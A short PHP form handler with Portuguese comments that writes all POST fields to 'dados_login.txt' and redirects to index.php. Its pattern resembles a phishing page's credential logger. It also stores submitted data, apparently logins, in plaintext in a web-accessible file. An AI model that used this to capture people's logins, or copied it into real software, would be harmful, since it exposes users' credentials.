<?php 
	#Recebendo os dados
	$dados = $_POST;

	#TRansformando o array em string
	$dados=implode(" -- ", $dados);

	#Criar um arquivo txt
	$arquivo = fopen("dados_login.txt", "a+");

	#Escrevendo os dados do produto no arquivo
	fwrite($arquivo, $dados."\n");

	#Fechar arquivo
	fclose($arquivo);

    header("location: index.php");
 ?>